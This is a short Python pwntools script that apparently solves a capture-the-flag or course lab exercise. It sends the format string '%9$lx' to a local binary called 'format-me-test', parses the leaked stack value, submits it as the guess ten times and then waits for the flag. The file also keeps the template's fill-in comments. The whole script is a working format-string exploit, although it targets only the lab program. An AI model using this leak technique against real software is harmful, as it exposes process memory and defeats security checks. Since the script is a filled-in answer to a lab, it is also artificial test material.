#!/usr/bin/env python3
from pwn import *

#%9$lx
#p/x code

context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./format-me-test")

r = process([exe.path])
# r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line
FORMAT_OFFSET = 9

for _ in range(10):
    # Add your code Here
    r.recvuntil(b"Recipient? ") # Think about what should be received first?
    format_string= f"%{FORMAT_OFFSET}$lx".encode()
    r.sendline(format_string) # Add your format string code here!
    
    response = r.recvuntil(b"...\n")
    response_str = response.decode()

    start_idx = len("Sending to ")
    end_idx = response_str.find("...")
    hex_val = response_str[start_idx:end_idx].strip()

    val = int(hex_val, 16)
    r.recvuntil(b"Guess? ")
    r.sendline(str(val).encode())
    r.recvuntil(b"Correct")

    # leak = r.recvline()
    # # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
    # val = leak[idx_1:idx_2] # you need to fill in idx_1, and idx_2 by yourself
    
    # r.recvuntil(b"xxx") #Think about what should be received?
    # r.sendline(val) 
    # r.recvuntil(b"Correct")

r.recvuntil(b"Here's your flag: ")
r.interactive()